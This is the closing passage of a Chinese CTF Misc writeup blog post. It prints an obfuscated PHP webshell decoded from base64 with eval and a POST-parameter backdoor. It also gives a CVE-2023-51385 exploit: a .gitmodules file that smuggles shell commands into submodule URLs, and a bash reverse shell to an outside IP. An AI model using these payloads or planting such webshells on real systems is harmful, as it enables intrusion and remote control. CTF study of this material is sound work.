+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00OO0</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00O0O</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">6</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O0OO00</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$OO0O00</span><span class="o">=</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">18</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$OO0000</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">7</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">13</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00O0O</span><span class="o">.=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">22</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">36</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">29</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">32</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">35</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$O00O0O</span><span class="p">(</span><span class="s2">&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//echo $O00O0O(&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O0O000</span><span class="o">=</span><span class="s2">&#34;uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*eval(&#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*echo &#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000)));*/</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;)));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">gzinflate</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//eval(@$_POST[&#39;flag{s1mpL3_z1p_@nd_w365heLl!!!}&#39;]);?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag{s1mpL3_z1p_@nd_w365heLl!!!}'</p>
+<h2 id="module" class="heading-element">
+  <a href="#module" class="heading-mark"></a>Module</h2><p>CVE-2023-51385</p>
+<p>参考博客：</p>
+<p><a href="https://blog.csdn.net/weixin_46944519/article/details/135249657"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_46944519/article/details/135249657</a></p>
+<p>在国内的 Gitee 上新建一个仓库包含以下两个文件，然后直接 git clone -v  项目地址 &ndash;recurse-submodules 即可</p>
+<p>.gitmodules 文件内容如下：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[submodule &#34;cve&#34;]
+</span></span><span class="line"><span class="cl">	path = cve
+</span></span><span class="line"><span class="cl">	url = https://`echo helloworld &gt; cve.txt`foo.ichunqiu.com/bar
+</span></span><span class="line"><span class="cl">[submodule &#34;test&#34;]
+</span></span><span class="line"><span class="cl">	path = test
+</span></span><span class="line"><span class="cl">	url = ssh://`bash shell.sh`foo.ichunqiu.com/bar</span></span></code></pre></td></tr></table>
+</div>
+</div><p>shell.sh 内容如下：</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;exec bash -i &amp;&gt;/dev/tcp/8.130.93.84/3232 &lt;&amp;1&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717215804819.png" alt="/posts/5de0d7e/imgs/image-20240717215804819.png" srcset="/posts/5de0d7e/imgs/image-20240717215804819.png?size=small, /posts/5de0d7e/imgs/image-20240717215804819.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717215804819.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717215804819.png" style="--width: 2047px;--aspect-ratio: 2047 / 1282;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-07-17 20:31:08">Updated on 2024-07-17&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/5de0d7e/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/5de0d7e/" data-title="2023 春秋杯冬季赛 Misc Writeup" data-via="https://twitter.com/goodlunatic007" data-hashtags="CTF,Writeup,Misc"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/5de0d7e/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/5de0d7e/" data-title="2023 春秋杯冬季赛 Misc Writeup"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/ctf/" class="post-tag" title="Tags - CTF">CTF</a><a href="/tags/writeup/" class="post-tag" title="Tags - Writeup">Writeup</a><a href="/tags/misc/" class="post-tag" title="Tags - Misc">Misc</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/2125dc5/" class="post-nav-item" rel="prev" title="2024 WKCTF Misc Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2024 WKCTF Misc Writeup</a>
+      <a href="/posts/01ebd40/" class="post-nav-item" rel="next" title="CTF-ICS Learning Record">CTF-ICS Learning Record<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+<aside class="toc" id="toc-auto" aria-label=""><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+  <div
+    class="toc-content"
+    id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.135.0">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://goodlunatic.github.io"target="_blank" rel="external nofollow noopener noreferrer">Lunatic</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":false},"data":{"typeit-header-desktop":"Lunatic BLOG","typeit-header-title-mobile":"Lunatic BLOG"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-subtitle-desktop":["typeit-header-subtitle-desktop"],"typeit-header-subtitle-mobile":["typeit-header-subtitle-mobile"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
